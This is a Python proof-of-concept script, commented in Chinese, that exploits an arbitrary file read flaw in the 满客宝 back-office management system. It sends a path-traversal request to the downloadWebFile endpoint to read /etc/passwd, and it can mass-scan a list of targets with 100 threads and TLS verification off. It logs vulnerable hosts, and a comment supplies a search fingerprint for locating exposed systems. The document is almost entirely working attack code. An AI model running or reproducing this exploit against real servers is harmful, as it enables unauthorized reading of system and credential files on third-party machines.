#满客宝后台管理系统downloadWebFile任意文件读取漏洞
#body="满客宝后台管理系统"
import requests,sys,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
    parser = argparse.ArgumentParser(description="满客宝任意文件读取")

    parser.add_argument('-u','--url',dest='url',type=str,help='Please inpur url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input flie')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"usage：{sys.argv[0]} -h or --help")
def poc(target):
    payload = "/base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    }
    try:
        res1 = requests.get(url=target+payload,verify=False,timeout=10,headers=headers)
        if 'bin/bash' in res1.content.decode("utf-8"):
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()